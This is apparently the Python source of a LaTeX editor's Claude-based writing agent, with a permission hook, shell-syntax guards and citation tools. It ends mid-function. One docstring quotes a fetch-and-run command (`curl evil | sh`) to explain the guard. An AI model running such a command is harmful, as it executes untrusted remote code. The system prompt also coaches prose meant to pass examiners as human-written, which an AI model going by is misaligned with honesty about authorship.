"""The writing agent: one Claude session per project, driven from the browser.

The agent is scoped to a writing project and nothing else. Its working
directory is the project root, so it cannot see NextTex's own source, and it
loads the project's own CLAUDE.md, so whatever rules a project has set for
itself apply without being restated here.

Two things are worth understanding before changing this file.

**The permission fence is a PreToolUse hook, not `can_use_tool`.** This was
established by testing, not by reading: with `can_use_tool` supplied and no
allowed_tools entry covering it, a Bash call still ran without the callback
ever firing, in every permission mode. The SDK's own shadowing warning names
the reliable mechanism -- "to gate every tool call, use a PreToolUse hook" --
and a hook does fire for every call, can return a deny decision, and can
await an answer from the browser before returning. `can_use_tool` is not
used here at all; a fence that silently does nothing is worse than none.

**Disk is the source of truth.** The agent uses ordinary Edit and Write.
Nothing here proxies edits through the editor, because the editor autosaves
to disk and watches it. The custom tools below exist only for the things a
filesystem cannot express -- where the cursor is, what the compiler said.

**A turn outlives the request that started it.** Everything a turn produces
-- streamed text, tool calls, edits, permission cards -- goes into one queue
per project, and the turn runs as its own task. Two things follow. Closing
the browser mid-turn no longer abandons the agent halfway through, leaving
the next message to deadlock behind a half-consumed response. And because
permission cards travel the same queue as the text, they arrive in the order
they happened, so a card sits after the sentence that provoked it instead of
racing it through a side channel.
"""

from __future__ import annotations

import asyncio
import json
import secrets
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, AsyncIterator, Callable

from claude_agent_sdk import (
    AssistantMessage,
    ClaudeAgentOptions,
    ClaudeSDKClient,
    HookMatcher,
    ResultMessage,
    StreamEvent,
    SystemMessage,
    TextBlock,
    ThinkingBlock,
    ToolResultBlock,
    ToolUseBlock,
    UserMessage,
    create_sdk_mcp_server,
    tool,
)

SESSION_FILE = "session.json"

# Tools that never need asking about wherever they point: they change
# nothing outside the model's own head.
READ_ONLY_TOOLS = [
    "TodoWrite", "WebSearch", "WebFetch",
]

# Reading changes nothing, but a writing project is not a licence to read
# the whole disk: the point of scoping a session to a project is that it
# stays there.  Inside the project these are free; outside they ask.
READING_TOOLS = frozenset({"Read", "NotebookRead", "Glob", "Grep"})

SYSTEM_PROMPT = """\
You are helping write and maintain a document in NextTex, a LaTeX editor.

The user is looking at their source on the left and the rendered PDF on the
right. Edits you make appear in their editor within a second, so make them
directly rather than printing LaTeX for the user to copy.

How to work here:

- Prefer a small, surgical edit over rewriting a section. The user is
  reading the diff of what you changed.
- When you write prose, write finished prose. Not an outline, not a
  placeholder, not a comment saying what should go here.
- Match the document's existing conventions -- its macros, its citation
  commands, how its figures and tables are set up. Read a neighbouring
  section before adding to one.
- Never invent a citation. Use find_papers to get real ones and
  add_reference to add them from the publisher's own record. If you cannot
  verify a source exists, say so rather than producing a plausible key.
- Keep the document compiling. If you are unsure a construct is valid,
  compile and check rather than leaving it for the user to discover.

Explain what you changed in a sentence or two. The user can see the diff, so
do not restate it line by line.


# Writing prose that does not read as machine-written

This document will be read by examiners, referees and colleagues who read a
great deal of prose and can tell. The failure mode is not bad grammar; it is
prose that is fluent, symmetrical, hedged, and says less than it appears to.
Everything below is about avoiding that.

## Say the thing

Lead with the claim, then support it. Do not open a paragraph by announcing
what the paragraph will do, and do not close it by summarising what it just
did. If a sentence could be deleted without losing information, delete it.

Commit to what the evidence supports. "The calculations show X" when they do;
"X is consistent with Y, though Z remains possible" when that is the honest
state. What reads as machine-written is the stacked hedge that commits to
nothing -- "may potentially suggest that it could play a role in" -- and its
opposite, the confident sentence that contains no claim at all.

Prefer the specific to the general at every opportunity. Not "significantly
faster" but "roughly four times faster"; not "a range of methods" but the
names of the methods. A number, a compound, a method name or a mechanism is
worth more than any amount of careful phrasing around it.

## Sentences

Vary their length. Machine prose has a characteristic even rhythm -- clause,
comma, clause, full stop, over and over, every sentence between twenty and
thirty words. Real writing alternates: a long sentence that develops an idea,
then a short one that lands it.

Vary how they open. If three consecutive sentences begin with the subject of
the paragraph, or with a participial phrase, or with "This", rewrite one.

Put the grammatical subject early and make it something real. Prefer "the
wave packet crosses the intersection within 40 fs" to "it is observed that a
crossing of the intersection by the wave packet occurs on a timescale of
40 fs". Nominalisations -- "the determination of", "an investigation into" --
are where sentences go to die.

Passive voice is not banned. In a methods section it is often correct: the
apparatus, not the person, is the subject worth naming. Use it when the agent
genuinely does not matter, and use "we" when a choice was made.

## Words and phrases to avoid outright

These are the tells. They are not wrong English; they are the vocabulary of
generated text, and a reader who has seen a lot of it will notice a cluster
immediately.

- *delve, showcase, underscore, highlight (as a verb), leverage, utilise,
  robust, novel, comprehensive, seamless, crucial, pivotal, vital, key (as an
  adjective), significant when you have not tested significance*
- *It is important to note that; It is worth noting that; It should be
  emphasised that* -- if it is important, simply say it
- *plays a crucial role in; sheds light on; paves the way for; opens new
  avenues; holds promise for; a deeper understanding of*
- *In recent years, there has been growing interest in* -- and every other
  opener that describes the literature's mood rather than a fact
- *Moreover, Furthermore, Additionally* stacked at the head of consecutive
  sentences. One connective per paragraph is usually one more than needed
- *In conclusion; To summarise; In this section, we will* -- signposting that
  a heading already provides
- *Not only ... but also*; three-item lists where two items would do; pairs of
  near-synonyms joined by "and" ("robust and reliable", "clear and concise")
- *rich tapestry, landscape, realm, myriad, plethora, testament to, at the
  forefront of, cutting-edge, game-changing*

Do not simply swap a banned word for a synonym. If "this plays a crucial role
in the dynamics" becomes "this is important for the dynamics", nothing has
been fixed. Say what it does: "this coupling is what routes population to the
triplet state".

## Paragraphs

One idea per paragraph, stated in the first sentence. Then evidence,
qualification, or consequence -- and stop. Do not end on a sentence that
restates the opening in different words; that shape is the single most
recognisable feature of generated academic prose.

Let paragraphs be different lengths. Three sentences, then eight, then two.
Uniform blocks read as generated even when every sentence is good.

Use prose. A bulleted list is right for genuinely enumerable things --
parameters, steps in a procedure, conditions -- and wrong for an argument,
which needs the connective tissue that bullets remove.

## Fitting the document

Read the surrounding text before adding to it. Match its terminology exactly
-- if the document says "conical intersection seam", do not write "crossing
region" three paragraphs later. Match its level of hedging, its person
("we" or impersonal), its tense conventions for methods and results, and its
citation density. New prose should be indistinguishable in register from the
paragraph above it, not merely correct.

When you have written something, read it back and ask: does any sentence
exist only to introduce, connect, or summarise another sentence? Would a
specialist reader learn anything from it? Cut what fails."""


VOICE_PRECEDENCE = """\

# Voice takes precedence

This project carries a description of how its author actually writes, taken
from their own published work. Where that description and the general
guidance above disagree, the author's voice wins -- including where it
prefers something the guidance above discourages. Their document is supposed
to sound like them, not like a house style.

The guidance above still applies wherever the voice description is silent."""


# Characters that let one command line run more than one command.  A rule
# scoped to a first word means nothing in their presence.
SHELL_SYNTAX = ";&|`$><\n"


@dataclass
class EditRecord:
    """One file the agent changed, for the undo chip in the transcript."""

    tool: str
    path: str
    before: str | None
    after: str | None
    at: float = field(default_factory=time.time)


class ProjectAgent:
    """A live Claude session bound to one writing project."""

    def __init__(
        self,
        project_root: Path,
        state_dir: Path,
        *,
        context_prompt: Callable[[], str] | None = None,
        has_voice: Callable[[], bool] | None = None,
        editor_state: Callable[[], dict] | None = None,
        diagnostics: Callable[[], list[dict]] | None = None,
        compile_now: Callable[[], Any] | None = None,
        apply_edit: Callable[[Path, str], Any] | None = None,
        on_edit: Callable[[Path, str | None, str | None], Any] | None = None,
        reveal: Callable[[str, int], Any] | None = None,
        model: str | None = None,
    ):
        self.root = project_root.resolve()
        self.state_dir = state_dir
        self.context_prompt = context_prompt or (lambda: "")
        self.has_voice = has_voice or (lambda: False)
        self.editor_state = editor_state or (lambda: {})
        self.diagnostics = diagnostics or (lambda: [])
        self.compile_now = compile_now
        # Writes a file the way the HTTP layer does -- atomically, marking it
        # as ours so the watcher does not echo it back, and scheduling the
        # rebuild.  Without this an MCP tool would leave the editor stale.
        self.apply_edit = apply_edit
        # Called for edits the SDK makes directly.  Write, Edit and
        # MultiEdit do not pass through the session at all, so without this
        # they are versioned by nothing and rebuild nothing.
        self.on_edit = on_edit
        self.reveal = reveal
        # What the current turn was asked for, used to label the versions
        # this turn produces.
        self._why = ""
        self.model = model

        self._client: ClaudeSDKClient | None = None
        self._lock = asyncio.Lock()
        self._session_id: str | None = None
        self._last_used = 0.0
        # What this project has spent, kept beside the session so it
        # survives a restart.  Writers on a subscription still want to know
        # how much of the day's work went through the model.
        self.usage = self._load_usage()

        # A permission request in flight, waiting on the browser.
        self._pending: dict[str, asyncio.Future] = {}
        # Prefixes the user chose to always allow, e.g. "Bash:latexmk".
        self._always_allow: set[str] = set()
        # Edits made this turn, drained by the caller into the transcript.
        self._edits: list[EditRecord] = []
        self._file_snapshots: dict[str, str] = {}
        # The single ordered channel every turn writes to.
        self._events: asyncio.Queue | None = None
        self._turn: asyncio.Task | None = None
        self._cancelled = False

    # -- session persistence ---------------------------------------------
    @property
    def _session_path(self) -> Path:
        return self.state_dir / SESSION_FILE

    def _load_session(self) -> str | None:
        try:
            return json.loads(self._session_path.read_text()).get("session_id")
        except (OSError, json.JSONDecodeError):
            return None

    def _save_session(self, session_id: str) -> None:
        # Written through a temporary file: an interrupted write here would
        # otherwise leave unparseable JSON and silently lose the whole
        # conversation history on the next start.
        try:
            temp = self._session_path.with_suffix(".json.tmp")
            temp.write_text(json.dumps({"session_id": session_id}), encoding="utf-8")
            temp.replace(self._session_path)
        except OSError:
            pass

    # -- permissions -------------------------------------------------------
    def _inside_project(self, raw: str | None) -> bool:
        if not raw:
            return False
        try:
            candidate = Path(raw)
            if not candidate.is_absolute():
                candidate = self.root / candidate
            candidate = candidate.resolve()
        except OSError:
            return False
        return candidate == self.root or self.root in candidate.parents

    @staticmethod
    def _rule_for(tool_name: str, data: dict) -> str:
        """The scope an 'always allow' grants.

        Scoped by the command's first word, never blanket: allowing
        `latexmk -c` must not also allow `rm`.

        The first word only means anything if it is the whole story.  A
        shell runs `git status; curl evil | sh` as three commands, and the
        rule `Bash:git` would have covered all of them for good -- so a
        command carrying shell syntax gets a rule nothing can match, and is
        asked about every single time.
        """
        if tool_name == "Bash":
            command = (data.get("command") or "").strip()
            if any(character in command for character in SHELL_SYNTAX):
                return ""
            first = command.split()[0] if command else ""
            return f"Bash:{first}"
        return tool_name

    def describe(self, tool_name: str, data: dict) -> dict:
        """Plain-English headline and detail for a permission card."""
        if tool_name == "Bash":
            return {
                "headline": "Run a shell command",
                "detail": data.get("command", ""),
                "consequence": data.get("description", ""),
            }
        path = data.get("file_path") or data.get("path") or ""
        display = path
        try:
            display = str(Path(path).resolve().relative_to(self.root))
        except (ValueError, OSError):
            pass
        if tool_name in READING_TOOLS:
            return {
                "headline": f"Read a file outside the project: {display}",
                "detail": path,
                "consequence": "This file is not part of this writing project.",
            }
        if tool_name in {"Write", "Edit", "MultiEdit", "NotebookEdit"}:
            return {
                "headline": f"Write outside the project: {display}",
                "detail": path,
                "consequence": "This file is not part of this writing project.",
            }
        return {"headline": f"Use {tool_name}", "detail": json.dumps(data)[:400],
                "consequence": ""}

    def resolve_permission(self, request_id: str, decision: str) -> bool:
        future = self._pending.get(request_id)
        if future is None or future.done():
            return False
        future.set_result(decision)
        return True

    # -- hooks -------------------------------------------------------------
    # Tool calls that are always safe here: they only read, or they are our
    # own in-process tools.  Checked in the hook rather than delegated to
    # `allowed_tools`, so the decision lives in one place.
    # NextTex's own tools are allowed by construction: each one can only
    # read the project, write inside it, or ask a public catalogue about a
    # DOI.  None can reach the shell or a path outside the project, so a
    # card for them would be a card for nothing -- and a card for nothing
    # teaches the writer to click Allow without reading.
    _OWN_TOOL_PREFIX = "mcp__nexttex__"
    _ALWAYS_OK = frozenset(READ_ONLY_TOOLS) | {
        # How the model finds out which tools exist.  Asking the writer to
        # approve that is asking them to approve punctuation: it reads
        # nothing, changes nothing, and a card for it trains them to click
        # Allow without looking, which is exactly what the cards are for.
        "ToolSearch",
        "TodoWrite",
        "Task",
    }
    _WRITE_TOOLS = frozenset({"Write", "Edit", "MultiEdit", "NotebookEdit"})

    @staticmethod
    def _allow(reason: str = "") -> dict:
        return {"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "permissionDecisionReason": reason,
        }}

    @staticmethod
    def _deny(reason: str) -> dict:
        return {"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": reason,
        }}

    async def _pre_tool(self, input_data: dict, tool_use_id: str | None, ctx: Any) -> dict:
        """Decide whether a tool call may proceed, and snapshot what it will change.

        This is the security boundary.  It runs before every tool call and
        can block for as long as it takes the user to answer.
        """
        tool_name = input_data.get("tool_name", "")
        tool_input = input_data.get("tool_input") or {}

        if tool_name in self._ALWAYS_OK or tool_name.startswith(self._OWN_TOOL_PREFIX):
            return self._allow()

        if tool_name in READING_TOOLS:
            raw = (
                tool_input.get("file_path")
                or tool_input.get("path")
                or tool_input.get("notebook_path")
            )
            # Glob and Grep default to the working directory, which is the
            # project; only an explicit path can leave it.
            if raw is None or self._inside_project(raw):
                return self._allow("Inside the writing project.")

        if tool_name in self._WRITE_TOOLS:
            raw = tool_input.get("file_path") or tool_input.get("path")
            if self._inside_project(raw):
                # Snapshot first: the undo chip needs the previous contents,
                # and after the edit lands they are gone.
                path = Path(raw)
                if not path.is_absolute():
                    path = self.root / path
                try:
                    self._file_snapshots[str(path)] = path.read_text(
                        encoding="utf-8", errors="replace"
                    )
                except OSError:
                    self._file_snapshots[str(path)] = ""
                return self._allow("Inside the writing project.")
            # Falls through to ask.

        decision = await self._ask_user(tool_name, tool_input)
        if decision in {"allow", "always"}:
            return self._allow()
        result = self._deny("The user declined this action.")
        if self._cancelled:
            result["continue_"] = False
            result["stopReason"] = "Interrupted."
        return result

    async def _ask_user_would_return(self, tool_name: str, tool_input: dict) -> bool:
        """Whether a remembered rule already covers this call, without asking."""
        rule = self._rule_for(tool_name, tool_input)
        return bool(rule) and rule in self._always_allow

    async def _ask_user(self, tool_name: str, tool_input: dict) -> str:
        """Put a permission card in front of the user and wait for the answer."""
        rule = self._rule_for(tool_name, tool_input)
        if rule and rule in self._always_allow:
            return "allow"

        # Two tool calls can land in the same millisecond, and the second
        # then replaced the first's future -- which nothing ever resolved,
        # so that turn waited for an answer to a card nobody could see.
        request_id = f"perm-{int(time.time()*1000)}-{secrets.token_hex(3)}"
        future: asyncio.Future = asyncio.get_running_loop().create_future()
        self._pending[request_id] = future

        await self._emit({
            "type": "permission",
            "id": request_id,
            "tool": tool_name,
            "rule": rule,
            **self.describe(tool_name, tool_input),
        })

        try:
            decision = await future
        except asyncio.CancelledError:
            # An interrupt while a card is open must end the turn, not just
            # refuse this one call and let the agent carry on.
            self._cancelled = True
            return "deny"
        finally:
            self._pending.pop(request_id, None)

        if decision == "always":
            # An empty rule means nothing could be scoped safely -- a Bash
            # command with shell syntax in it.  Honour the allow, remember
            # nothing: the card comes back next time, which is the point.
            if rule:
                self._always_allow.add(rule)
        return decision

    async def _post_tool(self, input_data: dict, tool_use_id: str | None, ctx: Any) -> dict:
        """Record what an edit did, for the chip and its undo."""
        tool_name = input_data.get("tool_name", "")
        if tool_name not in self._WRITE_TOOLS:
            return {}
        raw = (input_data.get("tool_input") or {}).get("file_path")
        if not raw or not self._inside_project(raw):
            return {}
        path = Path(raw)
        if not path.is_absolute():
            path = self.root / path
        try:
            after = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            after = None
        before = self._file_snapshots.pop(str(path), None)
        if before == after:
            return {}
        try:
            display = str(path.resolve().relative_to(self.root))
        except (ValueError, OSError):
            display = str(path)
        self._edits.append(EditRecord(tool_name, display, before, after))
        if self.on_edit:
            try:
                self.on_edit(path, before, after)
            except Exception:
                pass   # a bookkeeping failure must not break the edit
        return {}

    def current_why(self) -> str:
        """What this turn was asked to do, for the version it produces."""
        return self._why

    def drain_edits(self) -> list[EditRecord]:
        edits, self._edits = self._edits, []
        return edits

    # -- custom tools ------------------------------------------------------
    def _tools_server(self):
        """Tools for things the filesystem cannot answer.

        Deliberately few. The agent already has Read, Write, Edit, Glob and
        Grep, and every tool added here costs context on every turn.
        """

        @tool(
            "editor_state",
            "Where the user is looking: the open file, the cursor line, and any "
            "text they have selected. Use this when they say 'here' or 'this'.",
            {},
        )
        async def editor_state(args: dict) -> dict:
            state = self.editor_state()
            return {"content": [{"type": "text", "text": json.dumps(state, indent=2)}]}

        @tool(
            "compile_diagnostics",
            "Errors and warnings from the most recent LaTeX build, with file "
            "and line numbers.",
            {},
        )
        async def compile_diagnostics(args: dict) -> dict:
            items = self.diagnostics()
            if not items:
                return {"content": [{"type": "text",
                                     "text": "The last build produced no errors or warnings."}]}
            lines = [
                f"{d.get('severity')}: {d.get('file')}:{d.get('line')} — {d.get('message')}"
                for d in items
            ]
            return {"content": [{"type": "text", "text": "\n".join(lines)}]}

        @tool(
            "compile",
            "Rebuild the document now and report whether it succeeded. Use this "
            "to check your own work before saying you are done.",
            {},
        )
        async def compile_document(args: dict) -> dict:
            if self.compile_now is None:
                return {"content": [{"type": "text", "text": "Compiling is unavailable."}],
                        "is_error": True}
            result = await self.compile_now()
            payload = result.as_dict() if hasattr(result, "as_dict") else result
            errors = payload.get("errorCount", 0)
            if errors:
                detail = "\n".join(
                    f"{d['file']}:{d['line']} — {d['message']}"
                    for d in payload.get("diagnostics", []) if d["severity"] == "error"
                )
                return {"content": [{"type": "text",
                                     "text": f"Build failed with {errors} error(s):\n{detail}"}]}
            return {"content": [{"type": "text",
                                 "text": f"Built cleanly in {payload.get('durationMs')} ms."}]}

        @tool(
            "insert_at_cursor",
            "Insert LaTeX at the user's cursor in the file they have open. Use "
            "this when they ask for something 'here'. Prefer it to Edit when "
            "there is no anchoring text to match on -- an empty section, or a "
            "blank line they are sitting on.",
            {"text": str},
        )
        async def insert_at_cursor(args: dict) -> dict:
            return self._insert(args.get("text", ""))

        @tool(
            "insert_figure",
            "Insert a figure environment at the cursor, referencing an image "
            "already in the project. Give the image path relative to the "
            "project root.",
            {"path": str, "caption": str, "label": str, "width": str},
        )
        async def insert_figure(args: dict) -> dict:
            path = str(args.get("path", "")).strip()
            if not path:
                return self._text("A figure needs the path of an image.")
            target = (self.root / path).resolve()
            if not target.is_file():
                return self._text(
                    f"There is no file at {path}. Upload the image first, or "
                    "check the path."
                )
            width = str(args.get("width") or "0.8\\linewidth")
            label = str(args.get("label") or "").strip()
            caption = str(args.get("caption") or "").strip()
            body = (
                "\\begin{figure}[htbp]\n"
                "  \\centering\n"
                f"  \\includegraphics[width={width}]{{{path}}}\n"
                + (f"  \\caption{{{caption}}}\n" if caption else "")
                + (f"  \\label{{{label}}}\n" if label else "")
                + "\\end{figure}\n"
            )
            return self._insert(body)

        @tool(
            "insert_table",
            "Insert a table at the cursor. Rows is a list of lists of cell "
            "text; the first row is treated as the header. Alignment is a "
            "column spec such as 'lrr'; omit it for left-aligned columns.",
            {
                "rows": list,
                "caption": str,
                "label": str,
                "alignment": str,
            },
        )
        async def insert_table(args: dict) -> dict:
            rows = args.get("rows") or []
            if not rows or not isinstance(rows, list):
                return self._text("A table needs rows.")
            body = _table(
                rows,
                str(args.get("caption") or "").strip(),
                str(args.get("label") or "").strip(),
                str(args.get("alignment") or "").strip(),
            )
            return self._insert(body)

        @tool(
            "goto",
            "Scroll the user's editor to a line, so they can look at what you "
            "are describing. Does not change anything.",
            {"path": str, "line": int},
        )
        async def goto(args: dict) -> dict:
            path = str(args.get("path", "")).strip()
            line = int(args.get("line") or 1)
            if not path:
                return self._text("Which file?")
            if self.reveal:
                self.reveal(path, line)
                return self._text(f"Showing {path}:{line} in the editor.")
            return self._text("The editor is not connected.")

        @tool(
            "find_papers",
            "Search the scholarly literature and return real papers with their "
            "DOIs. Use this before citing anything: it is the only way to get "
            "a citation that exists. Sources: crossref (default), openalex, "
            "semanticscholar. Set cited_by to a DOI to walk forward from a "
            "paper instead of searching by keyword.",
            {
                "query": str,
                "author": str,
                "years": str,
                "cited_by": str,
                "source": str,
                "limit": int,
            },
        )
        async def find_papers(args: dict) -> dict:
            from . import references

            limit = int(args.get("limit") or 8)
            try:
                if args.get("cited_by"):
                    found = await asyncio.to_thread(
                        references.cited_by, str(args["cited_by"]), limit
                    )
                else:
                    found = await asyncio.to_thread(
                        references.search,
                        str(args.get("query", "")),
                        source=str(args.get("source") or "crossref"),
                        author=str(args.get("author") or ""),
                        years=str(args.get("years") or ""),
                        limit=limit,
                    )
            except Exception as error:
                return self._text(f"The search failed: {error}")
            if not found:
                return self._text("Nothing matched.")
            lines = []
            for item in found:
                authors = item.get("authors") or ""
                lines.append(
                    f"- {item.get('title', '(untitled)')}\n"
                    f"  {authors} · {item.get('year') or 'n.d.'} · "
                    f"{item.get('venue') or ''}\n"
                    f"  doi: {item.get('doi') or '(none)'}"
                )
            return self._text("\n".join(lines))

        @tool(
            "add_reference",
            "Add a reference to the project's .bib file from its DOI. The "
            "entry is fetched from the publisher's own record -- never write "
            "one yourself. Returns the citation key to use.",
            {"doi": str, "bib_file": str},
        )
        async def add_reference(args: dict) -> dict:
            return await self.add_reference_tool(args)

        @tool(
            "check_references",
            "Re-check every entry in the bibliography against the record it "
            "claims to come from, and report anything that does not match.",
            {"bib_file": str},
        )
        async def check_references(args: dict) -> dict:
            from . import references

            bib = self._bib_path(str(args.get("bib_file") or ""))
            if bib is None:
                return self._text("There is no .bib file in this project.")
            result = await asyncio.to_thread(references.verify, bib)
            if not result["problems"]:
                return self._text(
                    f"All {result['checked']} entries check out against their "
                    "published records."
                )
            lines = [
                f"{len(result['problems'])} of {result['checked']} entries have "
                "problems:"
            ]
            for problem in result["problems"]:
                lines.append(f"- {problem['key']}: {'; '.join(problem['issues'])}")
            return self._text("\n".join(lines))

        return create_sdk_mcp_server(
            name="nexttex",
            version="1.0.0",
            tools=[
                editor_state, compile_diagnostics, compile_document,
                insert_at_cursor, insert_figure, insert_table, goto,
                find_papers, add_reference, check_references,
            ],
        )

    # -- helpers the tools share -------------------------------------------
    @staticmethod
    def _text(message: str) -> dict:
        return {"content": [{"type": "text", "text": message}]}

    def _display(self, path: Path) -> str:
        try:
            return str(path.resolve().relative_to(self.root))
        except (ValueError, OSError):
            return str(path)

    def _bib_path(self, named: str) -> Path | None:
        if named:
            candidate = (self.root / named).resolve()
            return candidate if self._inside_project(str(candidate)) else None
        # references.bib by convention, otherwise whatever .bib is there.
        preferred = self.root / "references.bib"
        if preferred.exists():
            return preferred
        found = sorted(self.root.rglob("*.bib"))
        return found[0] if found else None

    async def add_reference_tool(self, args: dict) -> dict:
        """Add one reference from its DOI.

        Lifted out of the MCP closure so that the write path -- which is the
        part that had the bug -- can be exercised without a live agent.
        """
        from . import references

        doi = str(args.get("doi", "")).strip()
        if not doi:
            return self._text("Which DOI?")
        bib = self._bib_path(str(args.get("bib_file") or ""))
        if bib is None:
            return self._text(
                "I cannot find a .bib file in this project. Create one "
                "first, or say which file to add to."
            )
        try:
            existing = bib.read_text(encoding="utf-8") if bib.exists() else ""
            result = await asyncio.to_thread(references.entry_for, doi, existing)
        except Exception as error:
            return self._text(f"Could not add it: {error}")
        if not result.get("added"):
            return self._text(result.get("reason", "nothing to do"))
        # Written back here, on the loop, through the same path as every
        # other edit the agent makes.  Writing it inside the worker thread
        # meant no version, no undo, no chip and no note that the next build
        # needs biber -- and it wrote a copy of the file read *before* the
        # network call, so anything typed into the bibliography during the
        # lookup was overwritten.
        current = bib.read_text(encoding="utf-8") if bib.exists() else ""
        text = references.appended(current, result["entry"])
        if self.apply_edit is None:
            return self._text("The editor is not connected.")
        self.apply_edit(bib, text)
        self._edits.append(
            EditRecord("add_reference", self._display(bib), current, text)
        )
        return self._text(
            f"Added to {self._display(bib)} as \\cite{{{result['key']}}} "
            f"— {result.get('title', '')}"
        )

    @staticmethod
    async def _maybe(value: Any) -> Any:
        if asyncio.iscoroutine(value):
            return await value
        return value

    def _insert(self, text: str) -> dict:
        """Put text at the user's cursor, as an ordinary undoable edit."""
        if not text:
            return self._text("Nothing to insert.")
        state = self.editor_state() or {}
        name = state.get("file")
        if not name:
            return self._text(
                "No file is open, so there is no cursor to insert at. Open "
                "one, or tell me which file and I will use Edit."
            )
        path = (self.root / name).resolve()
        if not self._inside_project(str(path)) or not path.is_file():
            return self._text(f"I cannot write to {name}.")
        try:
            before = path.read_text(encoding="utf-8")
        except OSError as error:
            return self._text(f"Could not read {name}: {error}")

        lines = before.split("\n")
        # The cursor line is 1-based and sits *before* the line it names, so
        # the insertion goes after it -- which is what "here" means when
        # somebody is sitting at the end of a paragraph.
        at = max(0, min(int(state.get("line") or len(lines)), len(lines)))

        # Text after \end{document} is typeset by nothing.  A cursor left
        # there -- which happens constantly, since it is the last line of a
        # new project -- would otherwise produce an edit that appears to
        # work, shows a diff, and changes no page.
        ended = next(
            (
                index
                for index, line in enumerate(lines)
                if line.lstrip().startswith("\\end{document}")
            ),
            None,
        )
        moved = False
        if ended is not None and at > ended:
            at = ended
            moved = True
        body = text if text.endswith("\n") else text + "\n"
        after = "\n".join(lines[:at]) + ("\n" if at else "") + body + "\n".join(lines[at:])

        if self.apply_edit is None:
            return self._text("The editor is not connected.")
        self.apply_edit(path, after)
        self._edits.append(EditRecord("insert", self._display(path), before, after))
        note = (
            " Your cursor was past \\end{document}, where nothing is typeset, "
            "so it went in just above that line instead."
            if moved
            else ""
        )
        return self._text(
            f"Inserted {len(body.splitlines())} lines into {self._display(path)} "
            f"after line {at}.{note}"
        )

    # -- lifecycle ---------------------------------------------------------
    def _options(self) -> ClaudeAgentOptions:
        system = SYSTEM_PROMPT
        extra = self.context_prompt()
        # The precedence note is only worth its tokens when there is a voice
        # description for the model to defer to.
        if self.has_voice():
            system += VOICE_PRECEDENCE
        if extra:
            system = f"{system}\n\n---\n\n{extra}"

        return ClaudeAgentOptions(
            cwd=str(self.root),
            system_prompt=system,
            model=self.model,
            # The project's own CLAUDE.md and settings load; NextTex's do not.
            setting_sources=["project"],
            include_partial_messages=True,
            # allowed_tools is deliberately empty and can_use_tool is
            # deliberately unset.  An entry in either shadows the PreToolUse
            # hook for that tool, and the hook is the fence.  Read-only tools
            # are waved through inside the hook instead, which keeps every
            # permission decision in one readable place.
            mcp_servers={"nexttex": self._tools_server()},
            hooks={
                "PreToolUse": [HookMatcher(hooks=[self._pre_tool])],
                "PostToolUse": [HookMatcher(hooks=[self._post_tool])],
            },
            resume=self._load_session(),
        )

    async def _ensure_client(self) -> ClaudeSDKClient:
        if self._client is not None:
            return self._client
        client = ClaudeSDKClient(options=self._options())
        await client.connect()
        self._client = client
        return client

    async def disconnect(self) -> None:
        client, self._client = self._client, None
        if client is not None:
            try:
                await client.disconnect()
            except Exception:
                pass

    @property
    def idle_seconds(self) -> float:
        return time.monotonic() - self._last_used if self._last_used else 0.0

    async def interrupt(self) -> None:
        self._cancelled = True
        if self._turn is not None and not self._turn.done():
            self._turn.cancel()
        if self._client is not None:
            try:
                await self._client.interrupt()
            except Exception:
                pass
        for future in list(self._pending.values()):
            if not future.done():
                future.cancel()

    # -- the conversation ---------------------------------------------------
    # One queue per project carries everything a turn produces, in the order
    # it happened.  The SSE route drains it; the turn does not care whether
    # anyone is listening.

    def _queue(self) -> asyncio.Queue:
        if self._events is None:
            self._events = asyncio.Queue()
        return self._events

    async def _emit(self, event: dict) -> None:
        await self._queue().put(event)

    async def events(self) -> AsyncIterator[dict]:
        """Drain the event queue. Safe to leave and re-enter mid-turn."""
        queue = self._queue()
        while True:
            yield await queue.get()

    @property
    def busy(self) -> bool:
        return self._turn is not None and not self._turn.done()

    async def ask(self, prompt: str) -> None:
        """Start a turn. Returns as soon as it is running, not when it ends.

        The turn is a task so that it survives the HTTP request that
        started it; the browser reads the result from the event stream.
        """
        if self.busy:
            raise RuntimeError("a turn is already running")
        self._cancelled = False
        self._why = prompt.strip().splitlines()[0][:120] if prompt.strip() else ""
        await self._emit({"type": "turn_start", "prompt": prompt})
        self._turn = asyncio.create_task(self._run_turn(prompt))

    async def _run_turn(self, prompt: str) -> None:
        try:
            await self._stream(prompt)
        except asyncio.CancelledError:
            await self._emit({"type": "done", "subtype": "interrupted"})
            raise
        except Exception as exc:  # a crashed turn must not stall the UI
            await self._emit({
                "type": "error",
                "message": f"{type(exc).__name__}: {exc}",
            })
            await self._emit({"type": "done", "subtype": "error"})
        finally:
            self._turn = None

    async def _stream(self, prompt: str) -> None:
        async with self._lock:
            self._last_used = time.monotonic()
            client = await self._ensure_client()
            await client.query(prompt)

            # With include_partial_messages on, text arrives twice: as
            # content_block_delta events and again in the completed
            # AssistantMessage.  The deltas are what makes the reply appear
            # as it is written, so those are rendered and the finished block
            # is used only to close the run -- emitting both would double
            # every sentence.
            streaming_text = False

            async for message in client.receive_response():
                if isinstance(message, StreamEvent):
                    event = getattr(message, "event", {}) or {}
                    if event.get("type") == "content_block_delta":
                        delta = event.get("delta") or {}
                        if delta.get("type") == "text_delta" and delta.get("text"):
                            streaming_text = True
                            await self._emit({"type": "text", "text": delta["text"]})
                    elif event.get("type") == "content_block_stop" and streaming_text:
                        streaming_text = False
                        await self._emit({"type": "text_end"})
                    continue

                if isinstance(message, SystemMessage):
                    session_id = (getattr(message, "data", {}) or {}).get("session_id")
                    if session_id and session_id != self._session_id:
                        self._session_id = session_id
                        self._save_session(session_id)
                    continue

                if isinstance(message, AssistantMessage):
                    for block in message.content:
                        if isinstance(block, ToolUseBlock):
                            await self._emit({
                                "type": "tool_use",
                                "id": block.id,
                                "name": block.name,
                                "input": block.input,
                            })
                        elif isinstance(block, TextBlock) and not streaming_text:
                            # No deltas arrived for this block, so nothing has
                            # been shown yet.
                            if block.text:
                                await self._emit({"type": "text", "text": block.text})
                                await self._emit({"type": "text_end"})
                    continue

                if isinstance(message, UserMessage):
                    # Tool results arrive as user messages; what the
                    # transcript wants from them is the edits they produced.
                    await self._flush_edits()
                    continue

                if isinstance(message, ResultMessage):
                    await self._flush_edits()
